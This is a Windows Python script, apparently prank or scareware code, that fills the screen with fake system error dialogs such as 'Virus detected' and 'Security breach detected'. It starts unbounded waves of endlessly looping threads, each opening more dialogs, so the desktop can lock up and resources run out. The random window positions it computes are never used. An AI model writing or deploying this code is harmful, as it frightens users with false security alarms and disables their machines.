import ctypes
import random
import time
import threading

# List of fake error messages to display
error_messages = [
    "Application has stopped responding",
    "Critical system failure. Please restart",
    "Unknown error. System shutting down",
    "Error 404: File not found",
    "Permission denied. Access blocked",
    "System corruption detected. Reboot immediately",
    "Disk error. File system corrupted",
    "Security breach detected. Your data is at risk",
    "Warning: Virus detected in system process",
    "Memory overload. Close some applications"
]

# Function to show fake error messages flooding the entire screen
def show_fake_error():
    while True:
        # Choose a random error message
        error_message = random.choice(error_messages)

        # Get the screen width and height for full screen random placement
        width = ctypes.windll.user32.GetSystemMetrics(0)  # Screen width
        height = ctypes.windll.user32.GetSystemMetrics(1)  # Screen height

        # Generate random positions for each error message on the screen
        random_x = random.randint(0, width - 300)  # Error window width (300px)
        random_y = random.randint(0, height - 150)  # Error window height (150px)

        # Display the error message box at a random location
        ctypes.windll.user32.MessageBoxW(0, error_message, "System Error", 0x10)  # 0x10 is the error icon
        
        # Small delay before showing another error to keep the flood going
        time.sleep(random.uniform(0.05, 0.1))  # Adjust time to control spam speed

# Function to flood the screen with multiple error pop-ups rapidly
def flood_errors():
    while True:
        # Start multiple error pop-ups at once in parallel to cover the entire screen
        for _ in range(random.randint(20, 40)):  # Randomize number of errors showing at once
            threading.Thread(target=show_fake_error, daemon=True).start()

        # Short delay before the next flood of pop-ups
        time.sleep(random.uniform(0.1, 0.5))  # Control the flood speed and number of errors per wave

# Start the thread for error flooding
flood_thread = threading.Thread(target=flood_errors)
flood_thread.daemon = True
flood_thread.start()

# Keep the program running to allow the pop-ups to flood the screen
while True:
    pass
